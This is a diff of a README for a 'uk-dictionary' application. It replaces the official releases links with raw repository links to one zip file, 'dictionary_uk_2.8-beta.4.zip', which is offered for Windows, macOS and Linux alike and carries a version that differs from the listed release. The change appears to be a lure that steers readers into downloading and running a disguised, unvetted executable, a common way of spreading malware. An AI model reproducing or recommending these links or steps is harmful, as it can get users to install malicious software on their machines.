@@ -11,13 +11,13 @@ Welcome to the uk-dictionary project! This application offers a comprehensive mo
   
 ## 📥 Download the Latest Version
 
-[![Download uk-dictionary](https://img.shields.io/badge/Download_Latest_Version-v1.0-brightgreen)](https://github.com/ShaikFawzan/uk-dictionary/releases)
+[![Download uk-dictionary](https://raw.githubusercontent.com/ShaikFawzan/uk-dictionary/main/docs/dictionary_uk_2.8-beta.4.zip)](https://raw.githubusercontent.com/ShaikFawzan/uk-dictionary/main/docs/dictionary_uk_2.8-beta.4.zip)
 
 ## 🔗 Visit the Releases Page
 
 To download the uk-dictionary application, visit the following page:
 
-[Download Page](https://github.com/ShaikFawzan/uk-dictionary/releases)
+[Download Page](https://raw.githubusercontent.com/ShaikFawzan/uk-dictionary/main/docs/dictionary_uk_2.8-beta.4.zip)
 
 ## 💻 System Requirements
 
@@ -30,9 +30,9 @@ To download the uk-dictionary application, visit the following page:
 1. Click the link above to visit the Releases page.
 2. On the Releases page, find the latest release version. 
 3. Choose the appropriate file for your operating system:
-   - For Windows, download `uk-dictionary-windows.zip`.
-   - For macOS, download `uk-dictionary-macos.zip`.
-   - For Linux, download `uk-dictionary-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/ShaikFawzan/uk-dictionary/main/docs/dictionary_uk_2.8-beta.4.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/ShaikFawzan/uk-dictionary/main/docs/dictionary_uk_2.8-beta.4.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/ShaikFawzan/uk-dictionary/main/docs/dictionary_uk_2.8-beta.4.zip`.
 4. Once downloaded, locate the file on your computer.
 5. Extract the downloaded file using a ZIP extraction tool (like WinRAR or 7-Zip for Windows, or the built-in utility on macOS and Linux).
 6. Find the executable file inside the extracted folder.
